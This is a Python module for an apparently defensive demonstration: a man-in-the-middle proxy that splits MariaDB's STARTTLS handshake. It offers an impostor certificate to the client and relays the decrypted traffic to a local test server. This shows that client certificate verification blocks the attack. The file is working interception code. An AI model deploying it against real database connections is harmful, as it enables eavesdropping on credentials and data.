"""
mitm_proxy.py - a man-in-the-middle for MariaDB's TLS, to attack ONE control.

It demonstrates, against our own throwaway server only, what "verified TLS"
actually buys. The proxy sits between the client and the real server and
presents an IMPOSTOR certificate (right host name "localhost", signed by a CA
the client never agreed to trust - certs/untrusted-ca.pem).

MariaDB's TLS is STARTTLS-style: the connection opens in plaintext, the server
sends its greeting, and only when the client asks (the SSLRequest packet) does
it upgrade. So a plain TCP relay cannot intercept it; the proxy has to speak
enough of the handshake to upgrade each leg at the right moment:

  1. accept the client (plaintext), open a plaintext socket to the real server
  2. forward the server greeting to the client
  3. read the client's SSLRequest packet, forward it to the server
  4. upgrade the CLIENT leg to TLS as a *server*, offering the impostor cert
  5. upgrade the SERVER leg to TLS as a *client*, verifying the real CA
  6. relay the now-decrypted bytes both ways, counting what it can read

Step 4 is where the defence lives: a client that verifies (ssl_verify_cert)
sends a fatal TLS alert instead of finishing the handshake, the wrap raises,
and the proxy reports the attack blocked. A client that does not verify
finishes the handshake and the proxy is in the path.

The proxy never records or prints credential bytes; it counts application
bytes to prove it was positioned to read them. Run via attacks/mitm_demo.py.
"""

import socket
import ssl
import threading
from pathlib import Path

CERTS = Path(__file__).resolve().parent.parent / "certs"


def _read_packet(sock):
    """Read one MySQL wire packet: 3-byte little-endian length, 1-byte seq, body."""
    header = _recv_exactly(sock, 4)
    if header is None:
        return None
    length = header[0] | (header[1] << 8) | (header[2] << 16)
    body = _recv_exactly(sock, length)
    return header + (body or b"")


def _recv_exactly(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def _pipe(src, dst, counter, idx):
    """Relay bytes one way; add how many bytes passed to counter[idx]."""
    try:
        while True:
            data = src.recv(65536)
            if not data:
                break
            counter[idx] += len(data)
            dst.sendall(data)
    except OSError:
        pass
    finally:
        for s in (src, dst):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass


class MitmResult:
    """What happened to one intercepted connection."""

    def __init__(self):
        self.tls_to_client = False     # did the client finish TLS with the impostor?
        self.blocked = False           # did the client refuse the impostor?
        self.error = None
        self.bytes_seen = 0            # application bytes the proxy could read


def handle(client_sock, server_host, server_port, result):
    server = socket.create_connection((server_host, server_port))
    try:
        client_sock.sendall(_read_packet(server))          # 2: greeting -> client
        ssl_request = _read_packet(client_sock)            # 3: SSLRequest
        if ssl_request is None:
            result.error = "client closed before TLS"
            return
        server.sendall(ssl_request)                        # forward it to the server

        # 4: become the "server" to the client, offering the impostor certificate.
        impostor = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        impostor.load_cert_chain(CERTS / "proxy-cert.pem", CERTS / "proxy-key.pem")
        try:
            client_tls = impostor.wrap_socket(client_sock, server_side=True)
        except ssl.SSLError as exc:
            result.blocked = True                          # the defence worked
            result.error = str(exc)
            return
        result.tls_to_client = True

        # 5: become a verifying "client" to the real server, so the login still works.
        # Build the context by hand (not create_default_context): Python 3.13+ turns on
        # VERIFY_X509_STRICT there, which rejects our minimal demo certs for a missing
        # Authority Key Identifier - exactly the certs PyMySQL accepts. We verify the CA
        # and the host name, just without that strict extension requirement.
        upstream = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        upstream.load_verify_locations(cafile=str(CERTS / "ca.pem"))
        upstream.verify_mode = ssl.CERT_REQUIRED
        upstream.check_hostname = True
        upstream.verify_flags &= ~ssl.VERIFY_X509_STRICT
        server_tls = upstream.wrap_socket(server, server_hostname="localhost")

        # 6: relay decrypted traffic both ways; count what we could read.
        counter = [0, 0]
        threads = [
            threading.Thread(target=_pipe, args=(client_tls, server_tls, counter, 0)),
            threading.Thread(target=_pipe, args=(server_tls, client_tls, counter, 1)),
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        result.bytes_seen = counter[0] + counter[1]
    finally:
        try:
            server.close()
        except OSError:
            pass


def serve_once(listen_port, server_host="127.0.0.1", server_port=3306):
    """Accept exactly one connection, intercept it, return the MitmResult."""
    result = MitmResult()
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("127.0.0.1", listen_port))
    listener.listen(1)
    listener.settimeout(15)
    try:
        client_sock, _ = listener.accept()
        with client_sock:
            try:
                handle(client_sock, server_host, server_port, result)
            except ssl.SSLError as exc:
                # A TLS error on the client leg is the client refusing the impostor.
                result.blocked = result.blocked or not result.tls_to_client
                result.error = str(exc)
            except OSError as exc:
                result.error = str(exc)
    except TimeoutError:
        result.error = "no client connected"
    finally:
        listener.close()
    return result
